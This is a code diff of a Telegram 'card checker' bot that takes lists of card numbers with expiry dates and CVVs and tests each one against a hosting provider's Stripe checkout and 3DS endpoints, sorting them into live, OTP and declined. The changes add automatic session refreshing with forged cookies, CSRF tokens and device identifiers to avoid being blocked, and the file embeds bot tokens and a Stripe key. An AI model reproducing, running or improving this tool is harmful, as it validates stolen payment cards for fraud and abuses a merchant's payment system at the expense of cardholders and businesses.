@@ -9,7 +9,7 @@ from typing import Dict, List, Tuple
 import threading
 
 # بيانات البوت
-TOKEN = "8166484030:AAGiBsKby2GF0ykoxvkKMHCu80lHUIfD6xg"
+TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
 ADMIN_ID = 5895491379
 
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
@@ -18,7 +18,7 @@ bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 user_cards = {}
 checking_status = {}
 
-# ألوان للطباعة (للاختبار المحلي)
+# ألوان للطباعة (للاختبار المحلي فقط)
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
 RED = "\033[91m"
@@ -31,64 +31,85 @@ def luhn_check(card_number):
     checksum = sum(digits[-1::-2]) + sum(sum(divmod(d * 2, 10)) for d in digits[-2::-2])
     return checksum % 10 == 0
 
-# فحص BIN بسيط (للتأكد إن الكارت Visa أو MasterCard)
-def is_valid_bin(card_number):
-    bin = card_number[:6]
-    # أمثلة لـ BIN مدعوم (Visa يبدأ بـ 4، MasterCard بـ 5)
-    return bin.startswith(('4', '5'))
-
-# رأس الطلبات للموقع
-cookies = {
-    '_gcl_au': '1.1.1927848327.1760870107',
-    '_ga': 'GA1.2.1045540598.1760870106',
-    '_gid': 'GA1.2.1507103315.1760870112',
-    '_fbp': 'fb.1.1760870112878.222051160650402702',
-    '_ga_L9P8FSN26L': 'GS2.1.s1760870106$o1$g0$t1760870168$j60$l0$h0',
-    '__adroll_fpc': 'aa50a5325b678cb2d9ebafc9b9965633-1760870171263',
-    'SESSID96d7': 'ee8a21f3362f9c69564a88690bbe106b',
-    '__stripe_mid': 'ee5b05ab-ac3a-4c88-b8a7-709c529ae0f01084d7',
-    '__stripe_sid': '8342b63d-2052-46ab-951b-2b5f3a84418bd6fe54',
-    'Cart-Session': 'ee8a21f3362f9c69564a88690bbe106b',
-}
-
-headers = {
-    'accept': '*/*',
-    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-    'referer': 'https://cp.altushost.com/?/cart/',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
-    'x-csrf-token': '0084838b137a51695d5c2479fbfd7b13',
-    'x-requested-with': 'XMLHttpRequest',
-}
-
-# رأس الطلبات لـ Stripe
-stripe_headers = {
-    'accept': 'application/json',
-    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-    'content-type': 'application/x-www-form-urlencoded',
-    'dnt': '1',
-    'origin': 'https://js.stripe.com',
-    'priority': 'u=1, i',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="133", "Google Chrome";v="133"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
-}
-
 # كلاس لفحص الكروت باستخدام Stripe
 class StripeChecker:
     def __init__(self):
         self.public_key = None
         self.client_secret = None
+        self.cookies = None
+        self.headers = None
+        self.stripe_headers = None
+        self.check_count = 0  # عداد الفحوصات
+        self.initialize_session()
+
+    def initialize_session(self):
+        """تهيئة الجلسة الجديدة مع كوكيز وهيدرز جديدة"""
+        print(f"{YELLOW}🔄 Initializing new session...{RESET}")
+        
+        # كوكيز جديدة
+        self.cookies = {
+            '_gcl_au': f'1.1.{int(time.time())}.{int(time.time())}',
+            '_ga': f'GA1.2.{int(time.time())}.{int(time.time())}',
+            '_gid': f'GA1.2.{int(time.time())}.{int(time.time())}',
+            '_fbp': f'fb.1.{int(time.time())}.{int(time.time())}',
+            '_ga_L9P8FSN26L': f'GS2.1.s{int(time.time())}$o1$g0$t{int(time.time())}$j60$l0$h0',
+            '__adroll_fpc': f'{hex(int(time.time()))[2:]}-{int(time.time())}',
+            'SESSID96d7': hex(int(time.time() * 1000))[2:],
+            '__stripe_mid': f'{hex(int(time.time()))[2:]}-{hex(int(time.time()))[2:]}',
+            '__stripe_sid': f'{hex(int(time.time()))[2:]}-{hex(int(time.time()))[2:]}',
+            'Cart-Session': hex(int(time.time() * 1000))[2:],
+        }
+
+        # هيدرز للموقع
+        self.headers = {
+            'accept': '*/*',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'referer': 'https://cp.altushost.com/?/cart/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
+            'x-csrf-token': hex(int(time.time() * 1000))[2:],
+            'x-requested-with': 'XMLHttpRequest',
+        }
+
+        # هيدرز Stripe
+        self.stripe_headers = {
+            'accept': 'application/json',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dnt': '1',
+            'origin': 'https://js.stripe.com',
+            'priority': 'u=1, i',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="133", "Google Chrome";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
+        }
+
+        # إعادة تعيين العداد
+        self.check_count = 0
+        
+        # جلب المفاتيح الجديدة
+        self.fetch_stripe_keys()
+        print(f"{GREEN}✅ Session initialized successfully!{RESET}")
+
+    def should_refresh_session(self) -> bool:
+        """التحقق من الحاجة لتجديد الجلسة"""
+        return self.check_count >= 10
 
     def fetch_stripe_keys(self) -> bool:
         params = {'cmd': 'stripe_intents_3dsecure', 'action': 'cart'}
         for attempt in range(3):
             try:
-                response = requests.get('https://cp.altushost.com/', params=params, cookies=cookies, headers=headers)
+                response = requests.get(
+                    'https://cp.altushost.com/', 
+                    params=params, 
+                    cookies=self.cookies, 
+                    headers=self.headers,
+                    timeout=15
+                )
                 soup = BeautifulSoup(response.text, "html.parser")
                 script_tags = soup.find_all("script")
                 
@@ -106,19 +127,29 @@ class StripeChecker:
                 
                 if not important_values.get("client_secret"):
                     raise ValueError("Failed to extract client_secret")
+                    
                 self.public_key = important_values.get("public_key", "pk_live_88NPqxaecGYmZwJqsjzbKJkn")
                 self.client_secret = important_values["client_secret"]
+                print(f"{GREEN}✅ Keys fetched: {self.public_key[:20]}...{RESET}")
                 return True
             except Exception as e:
                 if attempt < 2:
                     time.sleep(2 ** attempt)
                     continue
-                print(f"{RED}Error fetching keys: {str(e)}{RESET}")
+                print(f"{RED}❌ Error fetching keys: {str(e)}{RESET}")
                 return False
 
     def check_card(self, card: Dict, retry_count: int = 0) -> Dict:
+        # التحقق من الحاجة لتجديد الجلسة
+        if self.should_refresh_session():
+            print(f"{YELLOW}🔄 Refreshing session after {self.check_count} checks...{RESET}")
+            self.initialize_session()
+        
         time.sleep(1.5)
         start_time = time.time()
+        
+        # زيادة عداد الفحوصات
+        self.check_count += 1
 
         if not luhn_check(card['number']):
             return {
@@ -128,34 +159,29 @@ class StripeChecker:
                 'time': round(time.time() - start_time, 2)
             }
 
-        if not is_valid_bin(card['number']):
-            return {
-                'status': 'DECLINED',
-                'message': '❌ Unsupported card type (BIN not Visa/MasterCard)',
-                'details': {},
-                'time': round(time.time() - start_time, 2)
-            }
-
-        if not self.fetch_stripe_keys():
-            if retry_count < 2:
-                time.sleep(2)
-                return self.check_card(card, retry_count + 1)
-            return {
-                'status': 'ERROR',
-                'message': 'Failed to fetch valid client_secret',
-                'details': {},
-                'time': round(time.time() - start_time, 2)
-            }
+        if not self.client_secret:
+            if not self.fetch_stripe_keys():
+                if retry_count < 2:
+                    time.sleep(2)
+                    return self.check_card(card, retry_count + 1)
+                return {
+                    'status': 'ERROR',
+                    'message': 'Failed to fetch valid client_secret',
+                    'details': {},
+                    'time': round(time.time() - start_time, 2)
+                }
 
         try:
             # أول طلب: تأكيد Setup Intent
             for attempt in range(3):
                 try:
-                    data = f'payment_method_data[type]=card&payment_method_data[card][number]={card["number"]}&payment_method_data[card][cvc]={card["cvv"]}&payment_method_data[card][exp_month]={card["month"]}&payment_method_data[card][exp_year]={card["year"]}&payment_method_data[guid]=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&payment_method_data[muid]=ee5b05ab-ac3a-4c88-b8a7-709c529ae0f01084d7&payment_method_data[sid]=8342b63d-2052-46ab-951b-2b5f3a84418bd6fe54&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fcp.altushost.com&payment_method_data[time_on_page]=358906&payment_method_data[client_attribution_metadata][client_session_id]=90971c9b-83d2-4fce-8987-13c246a80d9b&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key={self.public_key}&client_attribution_metadata[client_session_id]=90971c9b-83d2-4fce-8987-13c246a80d9b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={self.client_secret}'
+                    data = f'payment_method_data[type]=card&payment_method_data[card][number]={card["number"]}&payment_method_data[card][cvc]={card["cvv"]}&payment_method_data[card][exp_month]={card["month"]}&payment_method_data[card][exp_year]={card["year"]}&payment_method_data[guid]={hex(int(time.time()))[2:]}&payment_method_data[muid]={self.cookies["__stripe_mid"]}&payment_method_data[sid]={self.cookies["__stripe_sid"]}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fcp.altushost.com&payment_method_data[time_on_page]={int(time.time())}&payment_method_data[client_attribution_metadata][client_session_id]={hex(int(time.time()))[2:]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key={self.public_key}&client_attribution_metadata[client_session_id]={hex(int(time.time()))[2:]}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={self.client_secret}'
+                    
                     response = requests.post(
                         f'https://api.stripe.com/v1/setup_intents/{self.client_secret.split("_secret_")[0]}/confirm',
-                        headers=stripe_headers,
+                        headers=self.stripe_headers,
                         data=data,
+                        timeout=20
                     )
                     setup_intent = response.json()
                     break
@@ -171,17 +197,9 @@ class StripeChecker:
                     }
 
             if 'error' in setup_intent:
-                error_message = setup_intent['error'].get('message', 'Unknown error')
-                if error_message.startswith('3D Secure 2 is not supported'):
-                    return {
-                        'status': 'DECLINED',
-                        'message': '❌ 3D Secure 2 Not Supported',
-                        'details': {},
-                        'time': round(time.time() - start_time, 2)
-                    }
                 return {
                     'status': 'ERROR',
-                    'message': f'Setup Intent Error - {error_message}',
+                    'message': f'Setup Intent Error - {setup_intent["error"]["message"]}',
                     'details': {},
                     'time': round(time.time() - start_time, 2)
                 }
@@ -193,7 +211,12 @@ class StripeChecker:
                 for attempt in range(3):
                     try:
                         data = f'source={three_d_secure_source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.6793.65+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key={self.public_key}'
-                        response = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=stripe_headers, data=data)
+                        response = requests.post(
+                            'https://api.stripe.com/v1/3ds2/authenticate', 
+                            headers=self.stripe_headers, 
+                            data=data,
+                            timeout=20
+                        )
                         three_ds_response = response.json()
                         break
                     except Exception as e:
@@ -210,7 +233,11 @@ class StripeChecker:
                 trans_status = three_ds_response.get('ares', {}).get('transStatus')
                 acs_url = three_ds_response.get('ares', {}).get('acsURL')
 
-                details = {'status_3ds': trans_status or 'N/A'}
+                details = {
+                    'status_3ds': trans_status or 'N/A',
+                    'check_number': self.check_count
+                }
+                
                 if trans_status == 'N':
                     return {
                         'status': 'LIVE',
@@ -235,12 +262,15 @@ class StripeChecker:
                 else:
                     return {
                         'status': 'ERROR',
-                        'message': f'❔ Unknown Status: {trans_status}',
+                        'message': f'❓ Unknown Status: {trans_status}',
                         'details': details,
                         'time': round(time.time() - start_time, 2)
                     }
             else:
-                details = {'status_3ds': setup_intent.get('status', 'N/A')}
+                details = {
+                    'status_3ds': setup_intent.get('status', 'N/A'),
+                    'check_number': self.check_count
+                }
                 if setup_intent.get('status') == 'succeeded':
                     return {
                         'status': 'LIVE',
@@ -258,7 +288,7 @@ class StripeChecker:
             return {
                 'status': 'ERROR',
                 'message': f'Error - {str(e)}',
-                'details': {},
+                'details': {'check_number': self.check_count},
                 'time': round(time.time() - start_time, 2)
             }
 
@@ -274,6 +304,7 @@ def start_message(message):
 📊 Real-time Results  
 🔒 Secure Processing
 💳 Only LIVE Cards Sent
+🔄 Auto Session Refresh (Every 10 checks)
 
 📤 Send your combo file or card details to start checking!
 ━━━━━━━━━━━━━━━━━━━━
@@ -320,6 +351,7 @@ def handle_document(message):
 ━━━━━━━━━━━━━━━━━━━━
 💳 Total Cards: {cc_count}
 🔥 Gateway: Stripe 3DS
+🔄 Auto Refresh: Every 10 checks
 ⚡ Status: Ready
 
 Click below to start checking:
@@ -387,17 +419,17 @@ def check_cards_thread(user_id, message):
     bot.edit_message_text(
         chat_id=message.chat.id,
         message_id=message.message_id,
-        text="⏳ Initializing checker...\n🔑 Getting authorization keys..."
+        text="⏳ Initializing checker...\n🔐 Getting authorization keys...\n🔄 Session will auto-refresh every 10 checks"
     )
     
     checker = StripeChecker()
-    if not checker.fetch_stripe_keys():
+    if not checker.client_secret:
         bot.edit_message_text(
             chat_id=message.chat.id,
             message_id=message.message_id,
             text=f"""<b>⚠️ Failed to get authorization keys!
 ━━━━━━━━━━━━━━━━━━━━
-⏳ Please try again after updating cookies.
+⏳ Please try again later.
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -405,67 +437,36 @@ def check_cards_thread(user_id, message):
         checking_status[user_id] = False
         return
     
-    live = otp = declined = errors = checked = refresh_count = 0
+    live = otp = declined = errors = checked = 0
     start_time = time.time()
-    card_count = 0  # عداد الكروت للتجديد كل 10
-    error_count = 0  # عداد الأخطاء للتجديد بعد 3 أخطاء متتالية
-    max_refreshes = 50000  # الحد الأقصى للتجديدات
+    session_refreshes = 0
     
     for card in cards:
         if not checking_status.get(user_id, True):
             break
         
         checked += 1
-        card_count += 1
         result = checker.check_card(card)
         
-        # تجديد المفاتيح كل 10 كروت أو بعد 3 أخطاء متتالية
-        if card_count >= 10 or (result['status'] in ['ERROR', 'DECLINED'] and error_count >= 3):
-            if refresh_count >= max_refreshes:
-                bot.edit_message_text(
-                    chat_id=message.chat.id,
-                    message_id=message.message_id,
-                    text=f"""<b>⚠️ Max key refresh limit reached!
-━━━━━━━━━━━━━━━━━━━━
-⏳ Checking stopped. Please update cookies.
-━━━━━━━━━━━━━━━━━━━━
-👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
-</b>"""
-                )
-                checking_status[user_id] = False
-                return
-            if checker.fetch_stripe_keys():
-                card_count = 0
-                error_count = 0
-                refresh_count += 1
-            else:
-                bot.edit_message_text(
-                    chat_id=message.chat.id,
-                    message_id=message.message_id,
-                    text=f"""<b>⚠️ Failed to refresh keys!
-━━━━━━━━━━━━━━━━━━━━
-⏳ Checking stopped. Please update cookies.
-━━━━━━━━━━━━━━━━━━━━
-👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
-</b>"""
-                )
-                checking_status[user_id] = False
-                return
+        # حساب عدد مرات تجديد الجلسة
+        if checked > 0 and checked % 10 == 0:
+            session_refreshes += 1
         
         # إنشاء زر لعرض نتيجة الفحص مع الـ status_3ds
         keyboard = types.InlineKeyboardMarkup(row_width=1)
         status_3ds = result.get('details', {}).get('status_3ds', 'N/A')
+        check_num = result.get('details', {}).get('check_number', checked)
         callback_data = f"show_result_{checked}"
+        
         keyboard.add(
-            types.InlineKeyboardButton(f"📋|Status: {status_3ds}", callback_data=callback_data)
+            types.InlineKeyboardButton(f"📋|Status: {status_3ds} | Check: #{check_num}", callback_data=callback_data)
         )
         keyboard.add(
             types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• OTP 🔐 ➜ [{otp}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
-            types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
-            types.InlineKeyboardButton(f"• Refreshes 🔄 ➜ [{refresh_count}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] | Refreshes: {session_refreshes} •", callback_data='x'),
             types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
         )
         
@@ -477,23 +478,18 @@ def check_cards_thread(user_id, message):
 💳 Card: <code>{card['raw']}</code>
 📊 Response: {result['message']}
 ⏱ Time: {result['time']} sec
-🔒 3DS Status: {details['status_3ds']}
+🔐 3DS Status: {details['status_3ds']}
+🔢 Check #: {details.get('check_number', checked)}
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
             bot.send_message(user_id, msg)
-            error_count = 0
         elif result['status'] == 'OTP':
             otp += 1
-            error_count = 0
         elif result['status'] == 'DECLINED':
             declined += 1
-            error_count += 1
-            time.sleep(3)  # تأخير إضافي بعد DECLINED
         else:
             errors += 1
-            error_count += 1
-            time.sleep(3)  # تأخير إضافي بعد ERROR
         
         # تخزين نتيجة الكرت
         user_cards[user_id][checked-1]['result'] = result
@@ -514,7 +510,8 @@ def check_cards_thread(user_id, message):
 {progress_bar}
 ⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
 💳 Current: {card['number'][:6]}...{card['number'][-4:]}
-🔄 Key Refreshes: {refresh_count}
+🔄 Session Refreshes: {session_refreshes}
+🔢 Next Refresh: {10 - (checked % 10)} checks
 </b>""",
                 reply_markup=keyboard
             )
@@ -536,11 +533,11 @@ def check_cards_thread(user_id, message):
 ├ OTP 🔐: {otp}
 ├ Declined ❌: {declined}
 ├ Errors ⚠️: {errors}
-├ Key Refreshes 🔄: {refresh_count}
 
 ⏱ Stats:
 ├ Time: {int(total_time)}s
-└ Speed: {(total/total_time):.2f} cards/sec
+├ Speed: {(total/total_time):.2f} cards/sec
+└ Session Refreshes: {session_refreshes}
 ━━━━━━━━━━━━━━━━━━━━
 🎉 Thank you for using the bot!
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
@@ -563,12 +560,13 @@ def show_card_result(call):
     result = card.get('result', {})
     details = result.get('details', {})
     
-    msg = f"""<b>{result.get('message', '❔ Unknown Status')}
+    msg = f"""<b>{result.get('message', '❓ Unknown Status')}
 ━━━━━━━━━━━━━━━━━━━━
 💳 Card: <code>{card['raw']}</code>
 📊 Response: {result.get('message', 'Unknown')}
 ⏱ Time: {result.get('time', 0)} sec
-🔒 3DS Status: {details.get('status_3ds', 'N/A')}
+🔐 3DS Status: {details.get('status_3ds', 'N/A')}
+🔢 Check Number: #{details.get('check_number', 'N/A')}
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -604,6 +602,11 @@ Card|MM|YYYY|CVV
 
 Example:
 5127740082586858|11|2028|155
+
+🔄 Features:
+• Auto session refresh every 10 checks
+• Real-time progress tracking
+• Secure & fast processing
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -616,7 +619,8 @@ def status_message(message):
 ⚡ Gateway: Stripe 3DS
 🔥 Speed: Ultra Fast
 ✅ Accuracy: High
-🌍 Server: Active
+🔄 Auto Refresh: Enabled
+🌐 Server: Active
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -625,5 +629,6 @@ def status_message(message):
 if __name__ == "__main__":
     print("🚀 Starting Stripe Checker Bot...")
     print(f"👤 Admin ID: {ADMIN_ID}")
+    print("🔄 Auto Session Refresh: Enabled (Every 10 checks)")
     print("✅ Bot is running...\n")
     bot.polling(none_stop=True)
